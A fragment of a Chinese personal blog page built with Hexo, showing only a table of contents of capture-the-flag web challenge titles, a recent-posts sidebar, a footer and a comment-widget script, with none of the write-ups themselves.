class="toc-number">7.</span> <span class="toc-text">7.easyupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-inget"><span class="toc-number">8.</span> <span class="toc-text">8.inget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">9.</span> <span class="toc-text">9.题目名称-文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-warmup"><span class="toc-number">10.</span> <span class="toc-text">10.warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-fakebook"><span class="toc-number">11.</span> <span class="toc-text">11.fakebook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-shrine"><span class="toc-number">12.</span> <span class="toc-text">12.shrine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-easytornado"><span class="toc-number">13.</span> <span class="toc-text">13.easytornado</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-supersqli"><span class="toc-number">14.</span> <span class="toc-text">14.supersqli</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-Web-php-include"><span class="toc-number">15.</span> <span class="toc-text">15.Web_php_include</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-php-rce"><span class="toc-number">16.</span> <span class="toc-text">16.php_rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-baby-web"><span class="toc-number">17.</span> <span class="toc-text">17.baby_web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-Web-php-unserialize"><span class="toc-number">18.</span> <span class="toc-text">18.Web_php_unserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-Web-python-template-injection"><span class="toc-number">19.</span> <span class="toc-text">19.Web_python_template_injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20-web2"><span class="toc-number">20.</span> <span class="toc-text">20.web2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21-simple-php"><span class="toc-number">21.</span> <span class="toc-text">21.simple_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-command-execution"><span class="toc-number">22.</span> <span class="toc-text">22.command_execution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-weak-auth"><span class="toc-number">23.</span> <span class="toc-text">23.weak_auth</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-xff-referer"><span class="toc-number">24.</span> <span class="toc-text">24.xff_referer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-simple-js"><span class="toc-number">25.</span> <span class="toc-text">25.simple_js</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-disabled-button"><span class="toc-number">26.</span> <span class="toc-text">26.disabled_button</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#27-cookie"><span class="toc-number">27.</span> <span class="toc-text">27.cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#28-backup"><span class="toc-number">28.</span> <span class="toc-text">28.backup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#29-robots"><span class="toc-number">29.</span> <span class="toc-text">29.robots</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#30-get-post"><span class="toc-number">30.</span> <span class="toc-text">30.get_post</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#31-view-source"><span class="toc-number">31.</span> <span class="toc-text">31.view_source</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32-mfw"><span class="toc-number">32.</span> <span class="toc-text">32.mfw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#33-ics-06"><span class="toc-number">33.</span> <span class="toc-text">33.ics-06</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#34-ics-05"><span class="toc-number">34.</span> <span class="toc-text">34.ics-05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#35-upload1"><span class="toc-number">35.</span> <span class="toc-text">35.upload1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#36-unserialize3"><span class="toc-number">36.</span> <span class="toc-text">36.unserialize3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#37-PHP2"><span class="toc-number">37.</span> <span class="toc-text">37.PHP2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#38-FlatScience"><span class="toc-number">38.</span> <span class="toc-text">38.FlatScience</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#39-Training-WWW-Robots"><span class="toc-number">39.</span> <span class="toc-text">39.Training-WWW-Robots</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#40-NewsCenter"><span class="toc-number">40.</span> <span class="toc-text">40.NewsCenter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#41-lottery"><span class="toc-number">41.</span> <span class="toc-text">41.lottery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#42-Confusion1"><span class="toc-number">42.</span> <span class="toc-text">42.Confusion1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#43-cat"><span class="toc-number">43.</span> <span class="toc-text">43.cat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#44-bug"><span class="toc-number">44.</span> <span class="toc-text">44.bug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#45-ics-07"><span class="toc-number">45.</span> <span class="toc-text">45.ics-07</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#46-unfinish"><span class="toc-number">46.</span> <span class="toc-text">46.unfinish</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#47-easy-web"><span class="toc-number">47.</span> <span class="toc-text">47.easy_web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#48-checkInGame"><span class="toc-number">48.</span> <span class="toc-text">48.checkInGame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#49-BadProgrammer"><span class="toc-number">49.</span> <span class="toc-text">49.BadProgrammer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#50-wzsc-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">50.</span> <span class="toc-text">50.wzsc_文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#51-%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-warmup"><span class="toc-number">51.</span> <span class="toc-text">51.题目名称-warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#52-catcat-new"><span class="toc-number">52.</span> <span class="toc-text">52.catcat-new</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#53-%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-SSRF-Me"><span class="toc-number">53.</span> <span class="toc-text">53.题目名称-SSRF Me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#54-i-got-id-200"><span class="toc-number">54.</span> <span class="toc-text">54.i-got-id-200</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#55-Zhuanxv"><span class="toc-number">55.</span> <span class="toc-text">55.Zhuanxv</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#56-wtf-sh-150"><span class="toc-number">56.</span> <span class="toc-text">56.wtf.sh-150</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#57-web-php-wrong-nginx-config"><span class="toc-number">57.</span> <span class="toc-text">57.web_php_wrong_nginx_config</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#58-upload"><span class="toc-number">58.</span> <span class="toc-text">58.upload</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/python/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/" title="软件测试"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/1676127008797.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="软件测试"/></a><div class="content"><a class="title" href="/python/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/" title="软件测试">软件测试</a><time datetime="2023-02-24T07:11:00.714Z" title="发表于 2023-02-24 15:11:00">2023-02-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/crypto/crypto/" title="crypto"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/b86a37974bed46521a0ed754bb72e45a.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="crypto"/></a><div class="content"><a class="title" href="/crypto/crypto/" title="crypto">crypto</a><time datetime="2023-02-24T07:10:51.443Z" title="发表于 2023-02-24 15:10:51">2023-02-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Web/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/" title="域名解析"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/bd1d78eb10e9f0020b63be426cb0920b.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="域名解析"/></a><div class="content"><a class="title" href="/Web/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/" title="域名解析">域名解析</a><time datetime="2023-02-24T06:22:42.336Z" title="发表于 2023-02-24 14:22:42">2023-02-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Web/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/" title="逻辑越权"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/501ea766baf4b2a2c91d2e163d7c4b04.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="逻辑越权"/></a><div class="content"><a class="title" href="/Web/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/" title="逻辑越权">逻辑越权</a><time datetime="2023-02-24T06:19:01.558Z" title="发表于 2023-02-24 14:19:01">2023-02-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Web/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/" title="版本控制"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/1676127097053.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="版本控制"/></a><div class="content"><a class="title" href="/Web/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/" title="版本控制">版本控制</a><time datetime="2023-02-24T06:19:01.546Z" title="发表于 2023-02-24 14:19:01">2023-02-24</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/1676127097053.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By jiutu2003</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'pmfnQAIlGrKZuL3XuDvicCUP-gzGzoHsz',
      appKey: '88cFnty7M7cl67dTJrrrLyPB',
      avatar: 'monsterid',
      serverURLs: 'https://pmfnqail.lc-cn-n1-shared.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>